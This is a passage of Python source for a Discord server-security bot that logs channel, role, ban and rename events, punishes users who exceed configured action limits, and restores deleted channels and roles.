                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{servericon}")
                    await securitylogs.send(embed=embed)
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                    if os.path.exists(f"systems\\security\\number\\AntiDeleteChannel\\{user.id}.txt"):
                        try:
                            f = open(f"systems\\security\\number\\AntiDeleteChannel\\{user.id}.txt", "r")
                            userid = int(f.read())
                            f.close()
                            w = open(f"systems\\security\\number\\AntiDeleteChannel\\{user.id}.txt", "w")
                            userid = userid + 1
                            userid = str(userid)
                            w.write(f"{userid}")
                            userid = int(userid)
                        except:
                            return
                        if userid == deletechannelslim or userid > deletechannelslim:
                            try:
                                member = guild.get_member(int(user.id))
                                if PunishmentAntiDeleteChannel == "Ban Member":
                                    await member.ban(reason="Member get Ban by Bot reason DeleteChannels")
                                if PunishmentAntiDeleteChannel == "Kick Member":
                                    await member.kick(reason="Member get kick by Bot reason DeleteChannels")
                                if PunishmentAntiDeleteChannel == "Remove All Roles":
                                    for i in member.roles:
                                        if i.name == "@everyone":
                                            print(f"Can't remove the role {i}")
                                        else:
                                            try:
                                                await member.remove_roles(i)
                                            except:
                                                print(f"Can't remove the role {i}")
                                if PunishmentAntiDeleteChannel == "None":
                                    pass
                                w.close()
                                os.system(f"del systems\\security\\number\\AntiDeleteChannel\\{user.id}.txt")
                            except:
                                w.close()
                                os.system(f"del systems\\security\\number\\AntiDeleteChannel\\{user.id}.txt")
                                return print("The bot has no permissions, reason (DeleteChannels)")
                    if not os.path.exists(f"systems\\security\\number\\AntiDeleteChannel\\{user.id}.txt"):
                        with open(f"systems\\security\\number\\AntiDeleteChannel\\{user.id}.txt", "w") as wn:
                            wn.write("1")
                            wn.close()
                    if os.path.exists(f"{secupdate}Reconstruction\\Channel.txt"):
                        try:
                            if isinstance(channel, discord.TextChannel):
                                if channel.category:
                                    category = channel.category
                                    channel_name = channel.name
                                    channel_permissions = channel.overwrites
                                    channel_topic = channel.topic
                                    new_channel = await channel.guild.create_text_channel(
                                        name=channel_name,
                                        overwrites=channel_permissions,
                                        category=category,
                                        topic=channel_topic
                                    )
                                else:
                                    channel_name = channel.name
                                    channel_permissions = channel.overwrites
                                    channel_topic = channel.topic
                                    new_channel = await channel.guild.create_text_channel(
                                        name=channel_name,
                                        overwrites=channel_permissions,
                                        topic=channel_topic
                                    )
                            if isinstance(channel, discord.VoiceChannel):
                                if channel.category:
                                    category = channel.category
                                    channel_name = channel.name
                                    channel_permissions = channel.overwrites
                                    new_channel = await channel.guild.create_voice_channel(
                                        name=channel_name,
                                        overwrites=channel_permissions,
                                        category=category
                                    )
                                else:
                                    channel_name = channel.name
                                    channel_permissions = channel.overwrites
                                    new_channel = await channel.guild.create_voice_channel(
                                        name=channel_name,
                                        overwrites=channel_permissions
                                    )
                        except:
                            pass



deleteroles = open("systems\\security\\limit\\AntiDeleterole.txt", "r")
deleteroleslim = int(deleteroles.read())
deleteroles.close()
@bot.event
async def on_guild_role_delete(role):
    if os.path.exists(f"{secupdate}esecurity\\AntiDeleterole.txt"):
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete, oldest_first=False):
            user = entry.user
            if not role.is_bot_managed():
                if user.id == bot.user.id:
                    return
                if not user.id == bot.user.id:
                    if os.path.exists(f"systems\\security\\Permissions\\Deleterolesperm\\{user.id}.txt"):
                        embed = discord.Embed(title="〈🔨〉Security Logs Delete Roles", description=f"**The security system detected an attempt to delete Roles**", color=colorembed)
                        embed.add_field(name=f"〈🔧〉Role Deleted", value=f"**Role Name:** ``{role.name}``\n**Role ID:** ``{role.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        await securitylogs.send(embed=embed)
                    if not os.path.exists(f"systems\\security\\Permissions\\Deleterolesperm\\{user.id}.txt"):
                        embed = discord.Embed(title="〈🔨〉Security Logs Delete Roles", description=f"**The security system detected an attempt to delete Roles**", color=colorembed)
                        embed.add_field(name=f"〈🔧〉Role Deleted", value=f"**Role Name:** ``{role.name}``\n**Role ID:** ``{role.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        await securitylogs.send(embed=embed)
                        if os.path.exists(f"systems\\security\\number\\AntiDeleterole\\{user.id}.txt"):
                            try:
                                f = open(f"systems\\security\\number\\AntiDeleterole\\{user.id}.txt", "r")
                                userid = int(f.read())
                                f.close()
                                w = open(f"systems\\security\\number\\AntiDeleterole\\{user.id}.txt", "w")
                                userid = userid + 1
                                userid = str(userid)
                                w.write(f"{userid}")
                                userid = int(userid)
                            except:
                                return
                            if userid == deleteroleslim or userid > deleteroleslim:
                                try:
                                    member = guild.get_member(int(user.id))
                                    if PunishmentAntiDeleterole == "Ban Member":
                                        await member.ban(reason="Member get Ban by Bot reason DeleteRoles")
                                    if PunishmentAntiDeleterole == "Kick Member":
                                        await member.kick(reason="Member get kick by Bot reason DeleteRoles")
                                    if PunishmentAntiDeleterole == "Remove All Roles":
                                        for i in member.roles:
                                            if i.name == "@everyone":
                                                print(f"Can't remove the role {i}")
                                            else:
                                                try:
                                                    await member.remove_roles(i)
                                                except:
                                                    print(f"Can't remove the role {i}")
                                    if PunishmentAntiDeleterole == "None":
                                        pass
                                    w.close()
                                    os.system(f"del systems\\security\\number\\AntiDeleterole\\{user.id}.txt")
                                except:
                                    w.close()
                                    os.system(f"del systems\\security\\number\\AntiDeleterole\\{user.id}.txt")
                                    return print("The bot has no permissions, reason (Deleterole)")
                        if not os.path.exists(f"systems\\security\\number\\AntiDeleterole\\{user.id}.txt"):
                            with open(f"systems\\security\\number\\AntiDeleterole\\{user.id}.txt", "w") as wn:
                                wn.write("1")
                                wn.close()
                        if os.path.exists(f"{secupdate}Reconstruction\\Role.txt"):
                            permissions = role.permissions
                            color = role.color
                            hoist = role.hoist
                            mentionable = role.mentionable
                            name = role.name

                            new_role = await guild.create_role(
                                name=name,
                                permissions=permissions,
                                color=color,
                                hoist=hoist,
                                mentionable=mentionable,
                            )






#Security Commands--------------------------------------------------------------------------
"""
@bot.command(name='add-everyone-role')
@commands.is_owner()
async def sendmessage1(ctx: commands.Context, role: discord.Role,):
    guild = bot.get_guild(guildid)
    for members in guild.members:
        await asyncio.sleep(4)
        await members.add_roles(role)
        print(f"im add for ({members.name}) the role ({role.name})")
        print(members.name + "\n\n")


@bot.command(name='remove-everyone-role')
@commands.is_owner()
async def sendmessage1(ctx: commands.Context, role: discord.Role,):
    guild = bot.get_guild(guildid)
    for members in guild.members:
        await asyncio.sleep(8)
        await members.remove_roles(role)
        print(f"im remove for ({members.name}) the role ({role.name})")
        print(members.name + "\n\n")
"""
#Security Commands--------------------------------------------------------------------------




addrole = open("systems\\security\\limit\\addrole.txt", "r")
addrolelimit = int(addrole.read())
addrole.close()
nick = open("systems\\AutoNickRole\\AutoNickRole.txt", "r")
nickk = nick.read()
nick.close()
nnick = open("systems\\AutoNickRole\\AutoNick.txt", "r", encoding="utf-8")
nnickk = nnick.read()
nnick.close()
@bot.event
async def on_member_update(before, after):
    try:
        if os.path.exists(f"{secupdate}esecurity\\addrole.txt"):
            for role in after.roles:
                if role not in before.roles:
                    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.member_role_update, oldest_first=False):
                        user = entry.user
                        if user.id == bot.user.id:
                            return
                        if not user.id == bot.user.id:
                            rolec = discord.utils.get(guild.roles, name=role.name)
                            if rolec.permissions.administrator or rolec.permissions.manage_channels or rolec.permissions.manage_roles or rolec.permissions.manage_guild or rolec.permissions.ban_members or rolec.permissions.kick_members:
                                if os.path.exists(f"systems\\security\\Permissions\\addrole\\{user.id}.txt"):
                                    embed = discord.Embed(title="〈🔨〉Security Logs Give a role with high permissions", description=f"**The security system detected an attempt to Give a role with high permissions**", color=colorembed)
                                    embed.add_field(name=f"〈🔧〉Role information", value=f"**Role Name:** ``{role.name}``\n**Role ID:** ``{role.id}``", inline=False)
                                    embed.add_field(name=f"〈🌐〉The Giving User", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level:** ``〈💎〉Admin``", inline=True)
                                    embed.add_field(name=f"〈🌐〉Receiving User", value=f"**User Name:** ``{after.name}#{after.discriminator}``\n**User ID:** ``{after.id}``", inline=True)
                                    embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                    embed.set_thumbnail(url=f"{servericon}")
                                    await securitylogs.send(embed=embed)
                                if not os.path.exists(f"systems\\security\\Permissions\\addrole\\{user.id}.txt"):
                                    roleget = discord.utils.get(guild.roles, id=role.id)
                                    member = guild.get_member(after.id)
                                    try:
                                        await member.remove_roles(roleget)
                                    except:
                                        pass
                                    if os.path.exists(f"systems\\security\\number\\addrole\\{user.id}.txt"):
                                        try:
                                            f = open(f"systems\\security\\number\\addrole\\{user.id}.txt", "r")
                                            userid = int(f.read())
                                            f.close()
                                            w = open(f"systems\\security\\number\\addrole\\{user.id}.txt", "w")
                                            userid = userid + 1
                                            userid = str(userid)
                                            w.write(f"{userid}")
                                            userid = int(userid)
                                        except:
                                            pass
                                        if userid == addrolelimit or userid > addrolelimit:
                                            roleget = discord.utils.get(guild.roles, id=role.id)
                                            member = guild.get_member(after.id)
                                            try:
                                                if Punishmentaddrole == "Ban Member":
                                                    await user.ban(reason=f"{user.name} tried to give a role with high permissions to {after.name} without permissions from the bot rolename = {role.name}")
                                                if Punishmentaddrole == "Kick Member":
                                                    await user.kick(reason=f"{user.name} tried to give a role with high permissions to {after.name} without permissions from the bot rolename = {role.name}")
                                                if Punishmentaddrole == "Remove All Roles":
                                                    for i in member.roles:
                                                        if i.name == "@everyone":
                                                            print(f"Can't remove the role {i}")
                                                        else:
                                                            try:
                                                                await member.remove_roles(i)
                                                            except:
                                                                print(f"Can't remove the role {i}")
                                                if Punishmentaddrole == "None":
                                                    pass
                                            except:
                                                print(f"The bot has no permissions, reason {user.name} tried to give a role with high permissions to {after.name} without permissions from the bot rolename = {role.name}")
                                            w.close()
                                            os.system(f"del systems\\security\\number\\addrole\\{user.id}.txt")
                                    if not os.path.exists(f"systems\\security\\number\\addrole\\{user.id}.txt"):
                                        with open(f"systems\\security\\number\\addrole\\{user.id}.txt", "w") as wn:
                                            wn.write("1")
                                            wn.close()
                                    embed = discord.Embed(title="〈🔨〉Security Logs Give a role with high permissions", description=f"**The security system detected an attempt to Give a role with high permissions**", color=colorembed)
                                    embed.add_field(name=f"〈🔧〉Role information", value=f"**Role Name:** ``{role.name}``\n**Role ID:** ``{role.id}``", inline=False)
                                    embed.add_field(name=f"〈🌐〉The Giving User", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                                    embed.add_field(name=f"〈🌐〉Receiving User", value=f"**User Name:** ``{after.name}#{after.discriminator}``\n**User ID:** ``{after.id}``", inline=True)
                                    embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                                    embed.set_thumbnail(url=f"{servericon}")
                                    await securitylogs.send(embed=embed)
    except:
        pass



    if nickk == "true":
        try:
            if after.id != bot.user.id:
                old_roles = set(before.roles) - set(after.roles)
                new_role = set(after.roles) - set(before.roles)
                if new_role:
                    member = guild.get_member(after.id)
                    for rolee in reversed(member.roles):
                        role = discord.utils.get(guild.roles, name=rolee.name)
                        if f"{nnickk}" in role.name:
                            role = role.name
                            nick = role[:role.index(f"{nnickk}")]
                            await member.edit(nick=f"{nick} {nnickk} {member.name}")
                            break
                if old_roles:
                    role_with_star = None
                    member = guild.get_member(after.id)
                    for role in reversed(member.roles):
                        if f"{nnickk}" in role.name:
                            role_with_star = role
                            break
                    if role_with_star:
                        nickname = role_with_star.name.split(f"{nnickk}")[0].strip()
                        await member.edit(nick=f"{nickname} {nnickk} {member.name}")
                    else:
                        await member.edit(nick=f"{member.name}")
        except:
            pass
    




Antibanmemberslimit = open("systems\\security\\limit\\Antibanmembers.txt", "r")
Antibanmemberslimitm = int(Antibanmemberslimit.read())
Antibanmemberslimit.close()
@bot.event
async def on_member_ban(guild, member):
    if os.path.exists(f"{secupdate}esecurity\\Antibanmembers.txt"):
        try:
            guild = member.guild
            async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban, oldest_first=False):
                    user = entry.user
                    if user.id == bot.user.id:
                        return
                    if not user.id == bot.user.id:
                        if os.path.exists(f"systems\\security\\Permissions\\banMembersperm\\{user.id}.txt"):
                            embed = discord.Embed(title="〈🔨〉Security Logs ban Members", description=f"**The security system detected an attempt to ban Members**", color=colorembed)
                            embed.add_field(name=f"〈💬〉got banned", value=f"**User Name:** ``{member.name}#{member.discriminator}``\n**User ID:** ``{member.id}``", inline=True)
                            embed.add_field(name=f"〈🌐〉banned", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                            embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            await securitylogs.send(embed=embed)
                        if not os.path.exists(f"systems\\security\\Permissions\\banMembersperm\\{user.id}.txt"):
                            embed = discord.Embed(title="〈🔨〉Security Logs ban Members", description=f"**The security system detected an attempt to ban Members**", color=colorembed)
                            embed.add_field(name=f"〈💬〉got banned", value=f"**User Name:** ``{member.name}#{member.discriminator}``\n**User ID:** ``{member.id}``", inline=True)
                            embed.add_field(name=f"〈🌐〉banned", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                            embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                            embed.set_thumbnail(url=f"{servericon}")
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            await securitylogs.send(embed=embed)
                            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                            if os.path.exists(f"systems\\security\\number\\AntibanMembers\\{user.id}.txt"):
                                try:
                                    f = open(f"systems\\security\\number\\AntibanMembers\\{user.id}.txt", "r")
                                    userid = int(f.read())
                                    f.close()
                                    w = open(f"systems\\security\\number\\AntibanMembers\\{user.id}.txt", "w")
                                    userid = userid + 1
                                    userid = str(userid)
                                    w.write(f"{userid}")
                                    userid = int(userid)
                                except:
                                    return
                                if userid == Antibanmemberslimitm or userid > Antibanmemberslimitm:
                                    try:
                                        member = guild.get_member(int(user.id))
                                        if PunishmentAntibanmembers == "Ban Member":
                                            await member.ban(reason="Member get Ban by Bot reason ban Members")
                                        if PunishmentAntibanmembers == "Kick Member":
                                            await member.kick(reason="Member get kick by Bot reason ban Members")
                                        if PunishmentAntibanmembers == "Remove All Roles":
                                            for i in member.roles:
                                                if i.name == "@everyone":
                                                    print(f"Can't remove the role {i}")
                                                else:
                                                    try:
                                                        await member.remove_roles(i)
                                                    except:
                                                        print(f"Can't remove the role {i}")
                                        if PunishmentAntibanmembers == "None":
                                            pass
                                        w.close()
                                        os.system(f"del systems\\security\\number\\AntibanMembers\\{user.id}.txt")
                                    except:
                                        w.close()
                                        os.system(f"del systems\\security\\number\\AntibanMembers\\{user.id}.txt")
                                        return print("The bot has no permissions, reason (ban Members)")
                        if not os.path.exists(f"systems\\security\\number\\AntibanMembers\\{user.id}.txt"):
                            with open(f"systems\\security\\number\\AntibanMembers\\{user.id}.txt", "w") as wn:
                                wn.write("1")
                                wn.close()
        except:
            pass


#Server Logs --------------------------------------------------------------------------------------------

@bot.event
async def on_guild_role_create(role):
    if os.path.exists(f"{secupdate}esecurity\\CreateRole.txt"):
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_create, oldest_first=False):
            user = entry.user
            if user.id == bot.user.id:
                return
            if not user.id == bot.user.id:
                if os.path.exists(f"systems\\security\\Permissions\\CreateRole\\{user.id}.txt"):
                    embed = discord.Embed(title="〈🔨〉Server Logs Role Created", description=f"**The Server System has Detected Role Creation**", color=discord.Colour.random())
                    embed.add_field(name=f"〈🔧〉Role Created", value=f"**Role Name:** ``{role.name}``\n**Role ID:** ``{role.id}``", inline=True)
                    embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                    embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{servericon}")
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                    await securitylogs.send(embed=embed)
                if not os.path.exists(f"systems\\security\\Permissions\\CreateRole\\{user.id}.txt"):
                    embed = discord.Embed(title="〈🔨〉Server Logs Role Created", description=f"**The Server System has Detected Role Creation**", color=discord.Colour.random())
                    embed.add_field(name=f"〈🔧〉Role Created", value=f"**Role Name:** ``{role.name}``\n**Role ID:** ``{role.id}``", inline=True)
                    embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                    embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                    embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                    embed.set_thumbnail(url=f"{servericon}")
                    embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                    await securitylogs.send(embed=embed)
                    member = guild.get_member(user.id)
                    if PunishmentCreateRole == "Ban Member":
                        await member.ban(reason="Member get Ban by Bot reason Create Roles")
                    if PunishmentCreateRole == "Kick Member":
                        await member.kick(reason="Member get Kick by Bot reason Create Roles")
                    if PunishmentCreateRole == "Remove All Roles":
                        for i in member.roles:
                            if i.name == "@everyone":
                                print(f"Can't remove the role {i}")
                            else:
                                try:
                                    await member.remove_roles(i)
                                except:
                                    print(f"Can't remove the role {i}")
                    if PunishmentCreateRole == "None":
                        pass



@bot.event
async def on_guild_channel_create(channel):
    if os.path.exists(f"{secupdate}esecurity\\CreateChannel.txt"):
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_create, oldest_first=False):
            user = entry.user
            if user.id == bot.user.id:
                return
            if not user.id == bot.user.id:
                if os.path.exists(f"systems\\security\\Permissions\\CreateChannel\\{user.id}.txt"):
                    if channel.type == discord.ChannelType.text:
                        embed = discord.Embed(title="〈🔨〉Server Logs Channel Created", description=f"**The Server System has Detected Channel Creation\nType Channel:** ``〈💬〉Text Channel``", color=discord.Colour.random())
                        embed.add_field(name=f"〈🔧〉Channel Created", value=f"**Room Name:** ``{channel.name}``\n**Room ID:** ``{channel.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await securitylogs.send(embed=embed)
                    elif channel.type == discord.ChannelType.voice:
                        embed = discord.Embed(title="〈🔨〉Server Logs Channel Created", description=f"**The Server System has Detected Channel Creation\nType Channel:** ``〈📢〉Voice Channel``", color=discord.Colour.random())
                        embed.add_field(name=f"〈🔧〉Channel Created", value=f"**Room Name:** ``{channel.name}``\n**Room ID:** ``{channel.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await securitylogs.send(embed=embed)
                if not os.path.exists(f"systems\\security\\Permissions\\CreateChannel\\{user.id}.txt"):
                    if channel.type == discord.ChannelType.text:
                        embed = discord.Embed(title="〈🔨〉Server Logs Channel Created", description=f"**The Server System has Detected Channel Creation\nType Channel:** ``〈💬〉Text Channel``", color=discord.Colour.random())
                        embed.add_field(name=f"〈🔧〉Channel Created", value=f"**Room Name:** ``{channel.name}``\n**Room ID:** ``{channel.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await securitylogs.send(embed=embed)
                    elif channel.type == discord.ChannelType.voice:
                        embed = discord.Embed(title="〈🔨〉Server Logs Channel Created", description=f"**The Server System has Detected Channel Creation\nType Channel:** ``〈📢〉Voice Channel``", color=discord.Colour.random())
                        embed.add_field(name=f"〈🔧〉Channel Created", value=f"**Room Name:** ``{channel.name}``\n**Room ID:** ``{channel.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await securitylogs.send(embed=embed)
                    member = guild.get_member(user.id)
                    if PunishmentCreateChannel == "Ban Member":
                        await member.ban(reason="Member got Banned by the bot\nreason: Create Channels")
                    if PunishmentCreateChannel == "Kick Member":
                        await member.kick(reason="Member got Kicked by the bot\nreason: Create Channels")
                    if PunishmentCreateChannel == "Remove All Roles":
                        for i in member.roles:
                            if i.name == "@everyone":
                                print(f"Can't remove the role {i}")
                            else:
                                try:
                                    await member.remove_roles(i)
                                except:
                                    print(f"Can't remove the role {i}")
                    if PunishmentCreateChannel == "None":
                        pass

@bot.event
async def on_message_edit(before, after):
    if serverlogsem == "true":
        user = after.author
        if user.id == bot.user.id:
            return
        if not user.id == bot.user.id:
            if len(after.content) > 300:
                content = after.content[:300] + "..."
            else:
                content = after.content
            if len(before.content) > 300:
                content2 = before.content[:300] + "..."
            else:
                content2 = before.content
            embed = discord.Embed(title="〈🔨〉Server Logs Editing a message", description=f"**The Server System has Detected Editing a message**", color=colorembed)
            embed.add_field(name=f"〈💭〉Editing a message", value=f"**Before Editing The Message\n** ``{content2}``\n**After Editing The Message\n** ``{content}``", inline=True)
            embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``", inline=True)
            embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
            embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
            embed.set_thumbnail(url=f"{servericon}")
            embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
            await asyncio.sleep(1)
            await serverlogs.send(embed=embed)




@bot.event
async def on_guild_channel_update(before, after):
    if os.path.exists(f"{secupdate}esecurity\\UpChannel.txt"):
        if before.name != after.name:
            async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_update, oldest_first=False):
                user = entry.user
                if user.id == bot.user.id:
                    return
                if not user.id == bot.user.id:
                    if not os.path.exists(f"systems\\security\\Permissions\\UpChannel\\{user.id}.txt"):
                        embed = discord.Embed(title="〈🔨〉Server Logs Channel Update", description=f"**The Server System has Detected Channel Update**", color=discord.Colour.random())
                        embed.add_field(name=f"〈🔧〉Channel Update", value=f"**Before The Change Name\n** ``{before.name}``\n**After The Change Name\n** ``{after.name}``\n**Room ID:** ``{after.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await securitylogs.send(embed=embed)
                        member = guild.get_member(user.id)
                        if PunishmentUpChannel == "Ban Member":
                            await member.ban(reason="Member got Banned by the bot\nreason: Create Channels")
                        if PunishmentUpChannel == "Kick Member":
                            await member.kick(reason="Member got Kicked by the bot\nreason: Create Channels")
                        if PunishmentUpChannel == "Remove All Roles":
                            for i in member.roles:
                                if i.name == "@everyone":
                                    print(f"Can't remove the role {i}")
                                else:
                                    try:
                                        await member.remove_roles(i)
                                    except:
                                        print(f"Can't remove the role {i}")
                        if PunishmentUpChannel == "None":
                            pass
                        channel = guild.get_channel(after.id)
                        await channel.edit(name=before.name)
                    if os.path.exists(f"systems\\security\\Permissions\\UpChannel\\{user.id}.txt"):
                        embed = discord.Embed(title="〈🔨〉Server Logs Channel Update", description=f"**The Server System has Detected Channel Update**", color=discord.Colour.random())
                        embed.add_field(name=f"〈🔧〉Channel Update", value=f"**Before The Change Name\n** ``{before.name}``\n**After The Change Name\n** ``{after.name}``\n**Room ID:** ``{after.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await securitylogs.send(embed=embed)


@bot.event
async def on_guild_update(before, after):
    if os.path.exists(f"{secupdate}esecurity\\UpServer.txt"):
        if before.name != after.name:
            async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.guild_update, oldest_first=False):
                user = entry.user
                if user.id == bot.user.id:
                    return
                if user.id != bot.user.id:
                    if not os.path.exists(f"systems\\security\\Permissions\\UpServer\\{user.id}.txt"):
                        embed = discord.Embed(title="〈🔨〉Server Logs Server Update", description=f"**The Server System has Detected Server Update**", color=discord.Colour.random())
                        embed.add_field(name=f"〈🔧〉Server Update", value=f"**Before The Change Name\n** ``{before.name}``\n**After The Change Name\n** ``{after.name}``\n**Server ID:** ``{guild.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈❕〉User``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await securitylogs.send(embed=embed)
                        await guild.edit(name=before.name)
                    if os.path.exists(f"systems\\security\\Permissions\\UpServer\\{user.id}.txt"):
                        embed = discord.Embed(title="〈🔨〉Server Logs Server Update", description=f"**The Server System has Detected Server Update**", color=discord.Colour.random())
                        embed.add_field(name=f"〈🔧〉Server Update", value=f"**Before The Change Name\n** ``{before.name}``\n**After The Change Name\n** ``{after.name}``\n**Server ID:** ``{guild.id}``", inline=True)
                        embed.add_field(name=f"〈🌐〉User information", value=f"**User Name:** ``{user.name}#{user.discriminator}``\n**User ID:** ``{user.id}``\n**Access Level: **``〈💎〉Admin``", inline=True)
                        embed.add_field(name=f"〈⏳〉Date Time", value=f"``{datetime.now()}``", inline=False)
                        embed.set_author(name=f"{servername} Bot", icon_url=f"{servericon}")
                        embed.set_thumbnail(url=f"{servericon}")
                        embed.set_footer(text=f"© Copyright on LogicLab 2022 - 2023", icon_url=f"{servericon}")
                        await securitylogs.send(embed=embed)


@bot.event
async def on_guild_role_update(before, after):
    if os.path.exists(f"{secupdate}esecurity\\UpRole.txt"):
